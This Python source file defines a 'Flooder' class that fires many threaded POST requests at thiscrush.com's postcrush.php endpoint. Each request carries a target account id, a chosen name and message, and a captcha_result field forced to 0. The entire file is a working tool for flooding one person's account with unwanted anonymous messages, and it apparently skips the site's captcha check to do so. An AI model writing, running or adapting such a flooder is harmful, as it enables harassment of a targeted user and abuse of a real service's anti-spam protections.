from .request import PostRequest
from threading import Thread
from math import ceil

class Flooder(object):
    def floodAccount(self):
        self.url = "http://thiscrush.com/postcrush.php"
        self.payload = {
            "id": str(self.account),
            "private": "",
            "anon": "",
            "name": str(self.title),
            "comment": str(self.message),
            "captcha_result": 0
        }
        self.__startFlood()
    
    def __threadedClient(self, thread, times):
        for time in range(times):
            print("Thread {0} - Creating Request #{1}...".format(str(thread), str(time)))
            self.client.resolve()
            print("Thread {0} - Request #{1} resolved.".format(str(thread), str(time)))
        print("Thread {0} Done.".format(str(thread)))
    
    def __startFlood(self):
        self.client = PostRequest(
            url = self.url,
            payload = self.payload
        )

        print("Using {0} Thread(s) with {1} RPT (Requests Per Thread)".format(str(self.threads), str(self.times)))
        
        # return 0
        
        for thread in range(self.threads):
            Thread(
                target = self.__threadedClient,
                args = (thread, self.times)
            ).start()
        